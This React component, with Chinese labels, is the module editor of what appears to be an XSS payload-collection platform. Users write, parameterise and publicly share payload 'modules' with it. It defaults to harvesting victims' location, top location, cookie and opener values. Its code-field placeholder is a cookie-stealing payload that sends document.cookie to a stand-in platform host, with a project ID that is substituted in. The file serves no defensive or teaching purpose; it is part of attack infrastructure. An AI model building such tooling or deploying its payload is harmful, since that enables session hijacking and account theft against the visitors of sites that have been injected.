import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Card, CardContent } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Switch } from '@/components/ui/switch'
import { DynamicKeyEditor } from '@/components/dynamic-key-editor'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Textarea } from '@/components/ui/textarea'

export interface ModuleFormValue {
  title: string
  description: string
  keys: string[]
  setkeys: string[]
  code: string
  isOpen: boolean
}

export const DEFAULT_KEYS = ['location', 'toplocation', 'cookie', 'opener']

export function ModuleForm({
  initial,
  submitLabel,
  readOnly = false,
  pending = false,
  error,
  onSubmit,
}: {
  initial: ModuleFormValue
  submitLabel: string
  readOnly?: boolean
  pending?: boolean
  error?: string
  onSubmit: (value: ModuleFormValue) => void
}) {
  const [value, setValue] = useState<ModuleFormValue>(initial)

  function update<K extends keyof ModuleFormValue>(key: K, next: ModuleFormValue[K]) {
    setValue((prev) => ({ ...prev, [key]: next }))
  }

  return (
    <Card className="max-w-4xl">
      <CardContent className="flex flex-col gap-6">
        <div className="flex flex-col gap-2">
          <Label htmlFor="module-title">模块名称</Label>
          <Input
            id="module-title"
            value={value.title}
            readOnly={readOnly}
            onChange={(event) => update('title', event.target.value)}
          />
        </div>
        <div className="flex flex-col gap-2">
          <Label htmlFor="module-description">模块描述</Label>
          <Textarea
            id="module-description"
            value={value.description}
            readOnly={readOnly}
            onChange={(event) => update('description', event.target.value)}
          />
        </div>

        {readOnly ? (
          <div className="text-sm">
            参数：<span className="font-mono">{value.keys.join(', ')}</span>
            <br />
            配置参数：<span className="font-mono">{value.setkeys.join(', ')}</span>
          </div>
        ) : (
          <>
            <DynamicKeyEditor label="参数（需要服务器接收的参数名）" value={value.keys} onChange={(next) => update('keys', next)} />
            <DynamicKeyEditor
              label="配置参数（使用此模块时需要配置的参数，代码中引用 {set.***}）"
              value={value.setkeys}
              onChange={(next) => update('setkeys', next)}
            />
          </>
        )}

        <div className="flex flex-col gap-2">
          <Label htmlFor="module-code">代码</Label>
          <Textarea
            id="module-code"
            className="min-h-56 font-mono text-xs"
            value={value.code}
            readOnly={readOnly}
            onChange={(event) => update('code', event.target.value)}
            placeholder="(new Image()).src='https://your-platform/index.php?do=api&id={projectId}&cookie='+escape(document.cookie)"
          />
          <p className="text-xs text-muted-foreground">
            {'{projectId}'} 会替换为项目收包标识；{'set.***'} 会替换为上面配置参数的值。
          </p>
        </div>

        <div className="flex items-center justify-between gap-4 rounded-xl border border-border/70 px-3 py-3">
          <div className="flex flex-col gap-0.5">
            <Label htmlFor="module-open">公开到模块库</Label>
            <span className="text-xs text-muted-foreground">
              公开后需要管理员审核，通过后所有用户都可以使用
            </span>
          </div>
          {readOnly ? (
            <Badge variant={value.isOpen ? 'secondary' : 'outline'}>
              {value.isOpen ? '公开' : '私有'}
            </Badge>
          ) : (
            <Switch id="module-open" checked={value.isOpen} onCheckedChange={(next) => update('isOpen', next)} />
          )}
        </div>

        {error && <p className="text-sm text-destructive">{error}</p>}
        {!readOnly && (
          <div className="flex items-center gap-2 border-t border-border/70 pt-4">
            <Button onClick={() => onSubmit(value)} disabled={pending}>
              {submitLabel}
            </Button>
            <Button variant="outline" onClick={() => history.go(-1)}>
              取消
            </Button>
          </div>
        )}
      </CardContent>
    </Card>
  )
}
